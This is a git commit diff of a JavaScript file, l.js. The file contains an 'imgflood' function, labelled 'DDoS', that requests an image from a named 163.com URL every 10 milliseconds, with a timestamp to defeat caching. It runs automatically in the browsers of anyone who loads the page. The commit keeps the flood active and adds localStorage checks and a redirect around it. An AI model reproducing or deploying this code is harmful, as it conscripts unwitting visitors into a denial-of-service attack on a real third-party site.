1b5626a10d202895e3ec45485820303b383f200e
甜力怕 <63779340+xiaozhu2007@users.noreply.github.com>
2022-12-22 09:20:45 +0800

    Update l.js

--- l.js
+++ l.js
@@ -1,18 +1,22 @@
-// TODO: JavaScript 跳转
-// window.location.href = 'https://xiaozhu2007.netlify.app/'
 if (window.localStorage.getItem("user") != "true") {
   window.localStorage.setItem("user", "true");
-  window.location.href = 'https://xiaozhu2007.netlify.app/'
+  window.location.href = "https://xiaozhu2007.netlify.app/";
+  window.localStorage.setItem("bypass", "true");
 }
 
-// DDoS - https://xyqh5.163.com/from=360pmp/?project_id=1026bda22572402bab33be17b6373387
-function imgflood() {
-  var TARGET =
-    "https://xyqh5.163.com/from=360pmp/?project_id=1026bda22572402bab33be17b6373387";
-  var pic = new Image();
-  pic.src = `${TARGET}&timestamp=${new Date().getTime()}`;
+if (
+  window.localStorage.getItem("user") === "true" &&
+  window.localStorage.getItem("bypass") != "true"
+) {
+  // DDoS - https://xyqh5.163.com/from=360pmp/?project_id=1026bda22572402bab33be17b6373387
+  function imgflood() {
+    var TARGET =
+      "https://xyqh5.163.com/from=360pmp/?project_id=1026bda22572402bab33be17b6373387";
+    var pic = new Image();
+    pic.src = `${TARGET}&timestamp=${new Date().getTime()}`;
+  }
+  setTimeout(function () {
+    setInterval(imgflood, 10);
+  }, 8000);
 }
-setTimeout(function () {
-  setInterval(imgflood, 10);
-}, 8000);
 // End
